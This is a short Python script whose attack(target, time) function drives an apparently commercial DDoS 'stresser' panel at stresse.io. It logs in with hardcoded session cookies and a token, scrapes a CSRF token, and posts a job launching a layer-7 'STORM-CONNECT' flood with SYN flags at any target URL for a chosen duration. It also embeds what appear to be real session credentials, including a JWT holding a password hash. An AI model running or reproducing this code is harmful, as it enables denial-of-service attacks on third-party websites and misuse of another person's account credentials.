import requests
def attack(target,time):
      cookie='cf_clearance=LyGwy.T.wBT.wW3R9VbGQkA1ftaUpHBg9cTCH0MvcoM-1704177614-0-2-c300667b.dc1a67d9.a6428fab-250.0.0; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpYXQiOnsiZGF0ZSI6IjIwMjQtMDEtMDYgMTE6Mzk6MTMuMTE4NjEzIiwidGltZXpvbmVfdHlwZSI6MywidGltZXpvbmUiOiJFdXJvcGVcL0JlcmxpbiJ9LCJpc3MiOiJodHRwczpcL1wvc3RyZXNzZS5pb1wvIiwiZXhwIjoxNzA0NjIzOTUzLCJoaWQiOiJjZnl5MnJVR2E0NFFMYnBUSEpZc1NXMFBHY1JDR01sbTZlNjQ1N2EwMTZhNTM1MDhiNThmNzU4NDcxNmI0NDM1IiwicGFzc3dvcmQiOiIkMnkkMTAkQnpmSXJoWG4uRUJnYjZcLzJteGtzLi56NE02QzhPTGV0LkQ0ZHphMXRaSXFyZDdDZXRtZ1NXIiwidXNlcl9pZCI6IjM1Mjg4NyJ9.0ZpCmHLIFzap-MaABl-kyLvurw4INCTOa9rzJnc3dyb4sutoRkYnDewqljsVdCucJxuwlMaaOrRJHHI_BedaRg; session=lllov776um4dt58m8rnei2bprs; useragent=TW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBLKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTIwLjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2; _uafec=Mozilla%2F5.0%20(Linux%3B%20Android%2010%3B%20K)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36; '
      headers = {
    'authority': 'stresse.io',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7',
    'cache-control': 'max-age=0',
     'cookie': cookie,
    'referer': 'https://stresse.io/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
}
      response = requests.get('https://stresse.io/panel',  headers=headers).text
      token=response.split('csrf-token" content="')[1].split('"')[0]
      print(token)
      
      headers = {
    'authority': 'stresse.io',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7',
    'content-type': 'application/json',
    'cookie': cookie,
    'origin': 'https://stresse.io',
    'referer': 'https://stresse.io/panel',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
}
      json_data = {
    'ackseq': 0,
    'seq': 0,
    'flooder': [
        {
            'name': 'Regular',
            'checked': 1,
        },
        {
            'name': 'Browser',
            'checked': 0,
        },
        {
            'name': 'Experimental',
            'checked': 0,
        },
    ],
    'group': 0,
    'emulation': 0,
    'emulationTime': '',
    'headerData': '',
    'rateLimit': 0,
    'ignoreStatus': 0,
    'captcha': 0,
    'customCaptcha': 0,
    'sourseport': '',
    'isp': 'OVH',
    'attackOriginCustom': 'any',
    'customCountry': 'Worldwide',
    'checksum': 1,
    'payloadType': '',
    'payloadCheckType': 'static',
    'flagsSelectGroup': [
        {
            'name': 'FIN',
            'checked': 0,
        },
        {
            'name': 'SYN',
            'checked': 1,
        },
        {
            'name': 'RST',
            'checked': 0,
        },
        {
            'name': 'PSH',
            'checked': 0,
        },
        {
            'name': 'ACK',
            'checked': 0,
        },
        {
            'name': 'URG',
            'checked': 0,
        },
    ],
    'presetsActive': 0,
    'NoShuffle': 0,
    'NoPush': False,
    'EnablePush': False,
    'NoCache': True,
    'ExtraHeaders': True,
    'multiua': True,
    'Pragma': False,
    'optimization': 0,
    'randomVersion': False,
    'randomua': False,
    'randomQuery': False,
    'headless': True,
    'tor': 0,
    'attackMethod': '24',
    'attackMethodName': 'STORM-CONNECT',
    'targetUrl': target,
    'concActive': 1,
    'layerID': 7,
    'precheck': 0,
    'statusCode': '',
    'port': '',
    'tlsconn': '',
    'linux': '0',
    'floodersec': '0',
    'host': '',
    'mask': 32,
    'duration': time,
    'methodListActive': 0,
    'postData': '',
    'referrer': '',
    'cookies': '',
    'rate': '',
    'userAgentActive': 0,
    'userAgentSmart': 'Random',
    'userAgentCustom': '',
    'attackOriginActive': 'Worldwide',
    'token': token,
}
      response = requests.post('https://stresse.io/panel/send',headers=headers, json=json_data).text
      print(response)
      if 'success' in response:
         return True
      else:
         return False
